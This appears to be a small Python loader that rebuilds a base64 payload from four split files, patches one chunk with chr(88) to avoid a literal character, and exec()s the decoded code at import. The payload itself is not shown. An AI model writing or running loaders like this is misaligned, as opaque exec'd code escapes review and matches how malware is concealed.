"""Phase-9 evaluate loader (payload split for transport)."""
from __future__ import annotations

import base64
from pathlib import Path

_parts = []
for _i in range(4):
    _chunk = Path(__file__).with_name(f"_evaluate_b64_{_i}.txt").read_text().strip()
    # Transit-safe: MCP push once flipped base64 X->V in part 3; rebuild without a literal X.
    if _i == 3:
        _chunk = _chunk.replace("NEVxdVFq", "NEVxd" + chr(88) + "Fq")
    _parts.append(_chunk)
exec(compile(base64.b64decode("".join(_parts)), str(Path(__file__).resolve()), "exec"), globals())
